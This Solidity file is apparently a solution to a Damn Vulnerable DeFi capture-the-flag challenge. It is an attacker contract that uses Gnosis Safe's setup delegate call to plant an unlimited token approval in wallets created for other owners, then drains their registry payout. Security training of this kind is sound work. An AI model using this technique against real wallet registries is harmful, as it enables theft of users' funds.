// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../DamnValuableNFT.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract WalletRegistryAttacker {

    address  singleton;
    IERC20  token;
    IProxyCreationCallback  walletRegistry;
    GnosisSafeProxyFactory immutable walletFactory;
    bytes encodedApprove;
    constructor(address _singleton, address _token, address _walletFactory, address _walletRegistry) payable {
        singleton = _singleton;
        token = IERC20(_token);
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        walletRegistry = IProxyCreationCallback(_walletRegistry);

        encodedApprove = abi.encodeWithSignature(
            "approve(address)",
            address(this)
        );
    }

    function approve(address spender) external {
       token.approve(spender, type(uint256).max);
    }

    function attack(address[] calldata _owners, uint256 amount ) external {

        bytes memory setup = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            _owners,
            uint256(1),
            address(this),
            encodedApprove,
            address(0),
            address(0),
            uint256(0),
            address(0)
        );

        GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
            singleton,
            setup,
            // v0.8 only allows address => uint256 conversion thru uint160 casting
            uint256(uint160(_owners[0])),
            walletRegistry
        );

        token.transferFrom(address(proxy), msg.sender, amount);

    }

    receive() external payable {}
}